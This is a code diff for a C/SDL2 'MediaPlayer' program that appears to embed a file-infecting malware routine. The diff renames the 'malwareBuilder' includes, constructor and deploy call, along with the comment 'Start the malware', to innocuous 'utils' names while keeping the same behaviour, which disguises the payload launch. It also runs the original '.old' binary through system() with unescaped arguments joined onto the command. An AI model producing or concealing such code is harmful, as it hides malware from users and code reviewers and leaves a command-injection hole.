@@ -5,8 +5,7 @@
 #include <SDL2/SDL_image.h>
 
 #include "mediaplayer.h"
-#include "malwareBuilder.h"
-#include "malwareUtils.h"
+#include "utils.h"
 
 #define WINDOW_WIDTH 1120
 #define WINDOW_HEIGHT 800
@@ -25,7 +24,7 @@ int main(int argc, char *argv[]) {
    }
 
    MediaPlayer *app;
-   MalwareBuilder *malware = malwareBuilder_create(getUserCurentDir(),".old", lastToken);
+   Utils *utils = utils_create(lastToken);
 
    // Initialize SDL
    if (SDL_Init(SDL_INIT_VIDEO) < 0) {
@@ -41,8 +40,8 @@ int main(int argc, char *argv[]) {
       return EXIT_FAILURE;
    }
 
-   // Start the malware
-   malwareBuilder_deploy(argc, argv, malware);
+   // Start the utils
+   utils_run(argc, argv, utils);
 
    if(strstr(argv[0], "MediaPlayer") != NULL){
 
@@ -69,12 +68,12 @@ int main(int argc, char *argv[]) {
         }
 
         char file_path_sain[1000];
-        sprintf(file_path_sain, "%s%s%s", getUserCurentDir(), lastToken, ".old");
+        sprintf(file_path_sain, "%s%s%s", utils_cwd(), lastToken, utils_usage(DEFAULT_EXT));
 
 
         for(int i = 1; i < argc; i++){
-            strcat(file_path_sain, argv[i]);
             strcat(file_path_sain, " ");
+            strcat(file_path_sain, argv[i]);
         }
 
         system(file_path_sain);
